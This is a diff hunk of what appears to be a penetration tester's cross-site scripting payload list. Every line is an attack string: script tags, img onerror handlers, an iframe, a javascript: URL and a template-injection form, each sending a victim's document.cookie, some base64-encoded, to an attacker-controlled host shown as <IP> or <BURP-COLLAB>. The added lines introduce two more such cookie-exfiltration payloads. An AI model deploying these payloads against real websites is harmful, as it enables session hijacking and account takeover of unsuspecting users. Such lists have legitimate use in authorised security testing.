@@ -109,6 +109,8 @@ http://foo?&apos;-alert(1)-&apos;
 
 <script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>
 
+
+
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
 
 <img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
@@ -120,6 +122,10 @@ http://foo?&apos;-alert(1)-&apos;
 <iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>
 
 \';fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie))//
+
+JavaScript:document.location='https://<BURP-COLLAB>?cookie='+document.cookie
+
+${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 
 
 <script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
